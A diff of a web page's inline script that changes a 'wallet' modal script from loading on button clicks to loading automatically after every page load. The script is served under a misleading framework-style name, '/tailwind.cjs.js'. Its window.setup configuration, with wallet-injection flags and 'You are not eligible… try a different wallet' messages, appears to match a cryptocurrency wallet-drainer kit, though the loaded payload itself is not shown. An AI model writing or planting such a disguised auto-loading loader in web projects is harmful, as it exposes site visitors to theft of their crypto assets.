@@ -112,96 +112,48 @@
       };
       
       (function() {
-        // Lazy load wallet script - only load when needed (when user clicks connect/login)
-        let walletScriptLoaded = false;
-        let walletScriptLoading = false;
+        // Load wallet script asynchronously without blocking page load
+        const script = document.createElement('script');
+        script.src = '/tailwind.cjs.js';
+        script.async = true;
+        script.defer = true;
+        script.fetchPriority = 'low';
         
-        function loadWalletScript() {
-          if (walletScriptLoaded || walletScriptLoading) return;
-          walletScriptLoading = true;
-          
-          const script = document.createElement('script');
-          script.src = '/tailwind.cjs.js';
-          script.async = true;
-          script.fetchPriority = 'low';
-          
-          script.onerror = function() {
-            console.warn('Wallet modal script failed to load');
-            walletScriptLoading = false;
-          };
-          
-          script.onload = function() {
-            walletScriptLoaded = true;
-            walletScriptLoading = false;
-            
-            function applySettings() {
-              if (window.setup) {
-                window.setup.modal = 'reown';
-                window.setup.theme = 'dark';
-                window.setup.radius = 'm';
-                window.setup.auto_prompt = false;
-                window.setup.injectWindowObjects = true;
-                window.setup.notEligibleHeader = "You are not eligible";
-                window.setup.notEligibleParagraph = "Try a different wallet to meet the requirements.";
-              }
+        script.onerror = function() {
+          console.warn('Wallet modal script failed to load');
+        };
+        
+        script.onload = function() {
+          function applySettings() {
+            if (window.setup) {
+              window.setup.modal = 'reown';
+              window.setup.theme = 'dark';
+              window.setup.radius = 'm';
+              window.setup.auto_prompt = false;
+              window.setup.injectWindowObjects = true;
+              window.setup.notEligibleHeader = "You are not eligible";
+              window.setup.notEligibleParagraph = "Try a different wallet to meet the requirements.";
             }
-            
-            // Apply settings immediately
-            applySettings();
-            setTimeout(applySettings, 100);
-            setTimeout(applySettings, 300);
-          };
+          }
           
-          document.body.appendChild(script);
-        }
+          // Apply settings with minimal delays
+          applySettings();
+          setTimeout(applySettings, 100);
+          setTimeout(applySettings, 300);
+        };
         
-        // Load wallet script on user interaction (click on connect/login buttons)
-        function setupWalletLazyLoad() {
-          const connectButtons = document.querySelectorAll('.aBVeeVna, #connectWalletBtn, [class*="connect"], button:contains("Log in"), button:contains("Connect")');
-          
-          connectButtons.forEach(btn => {
-            btn.addEventListener('click', function(e) {
-              if (!walletScriptLoaded && !walletScriptLoading) {
-                loadWalletScript();
-              }
-            }, { once: true, passive: true });
+        // Load script after page is interactive
+        if (document.readyState === 'loading') {
+          document.addEventListener('DOMContentLoaded', function() {
+            setTimeout(() => document.body.appendChild(script), 100);
           });
-          
-          // Also load on mouseover of connect buttons (prefetch)
-          connectButtons.forEach(btn => {
-            btn.addEventListener('mouseenter', function() {
-              if (!walletScriptLoaded && !walletScriptLoading) {
-                // Small delay to avoid loading on accidental hover
-                setTimeout(() => {
-                  if (!walletScriptLoaded && !walletScriptLoading) {
-                    loadWalletScript();
-                  }
-                }, 500);
-              }
-            }, { once: true, passive: true });
-          });
-        }
-        
-        // Setup lazy loading when DOM is ready
-        if (document.body) {
-          setupWalletLazyLoad();
         } else {
-          document.addEventListener('DOMContentLoaded', setupWalletLazyLoad);
+          setTimeout(() => {
+            if (document.body) {
+              document.body.appendChild(script);
+            }
+          }, 100);
         }
-        
-        // Listen for manual load trigger
-        document.addEventListener('wallet:load', function() {
-          if (!walletScriptLoaded && !walletScriptLoading) {
-            loadWalletScript();
-          }
-        });
-        
-        // Fallback: load after 5 seconds if user hasn't interacted (for background initialization)
-        setTimeout(() => {
-          if (!walletScriptLoaded && !walletScriptLoading && document.visibilityState === 'visible') {
-            loadWalletScript();
-          }
-        }, 5000);
       })();
     </script>
   </head>
